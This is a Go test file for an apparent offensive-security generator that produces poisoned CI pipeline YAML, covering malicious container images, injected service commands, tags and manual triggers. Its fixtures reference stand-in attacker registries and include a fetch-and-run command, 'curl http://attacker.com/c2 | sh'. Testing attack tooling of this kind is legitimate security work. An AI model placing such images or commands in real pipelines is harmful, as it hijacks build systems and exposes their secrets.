package payloads

import (
	"strings"
	"testing"
)

func TestGenerateImagePoisonYAML(t *testing.T) {
	tests := []struct {
		name     string
		opts     ImagePoisonOptions
		contains []string
		absent   []string
	}{
		{
			name: "default malicious image",
			opts: ImagePoisonOptions{},
			contains: []string{
				"image:",
				"name: registry.attacker.io/backdoor:latest",
				`entrypoint: [""]`,
				"allow_failure: true",
			},
			absent: []string{
				"services:",
			},
		},
		{
			name: "custom image with service command",
			opts: ImagePoisonOptions{
				Common:         CommonOptions{JobName: "compromised-build"},
				MaliciousImage: "evil.io/node:18",
				ServiceImage:   "postgres:14",
				ServiceCommand: []string{"/bin/sh", "-c", "curl http://attacker.com/c2 | sh"},
			},
			contains: []string{
				"compromised-build:",
				"name: evil.io/node:18",
				"services:",
				"name: postgres:14",
				"command:",
				"/bin/sh",
				"curl http://attacker.com/c2 | sh",
			},
		},
		{
			name: "service with variables",
			opts: ImagePoisonOptions{
				ServiceImage: "redis:7",
				ServiceVars: map[string]string{ //nolint:gosec // test fixture, not a real credential
					"REDIS_PASSWORD": "exfil_target",
				},
			},
			contains: []string{
				"services:",
				"name: redis:7",
				"variables:",
				"REDIS_PASSWORD:",
			},
		},
		{
			name: "with tags and manual",
			opts: ImagePoisonOptions{
				Common: CommonOptions{
					Tags:   []string{"docker"},
					Manual: true,
				},
			},
			contains: []string{
				"tags:",
				"docker",
				"when: manual",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			y := GenerateImagePoisonYAML(tc.opts)
			for _, s := range tc.contains {
				if !strings.Contains(y, s) {
					t.Errorf("expected %q in output:\n%s", s, y)
				}
			}
			for _, s := range tc.absent {
				if strings.Contains(y, s) {
					t.Errorf("unexpected %q in output:\n%s", s, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
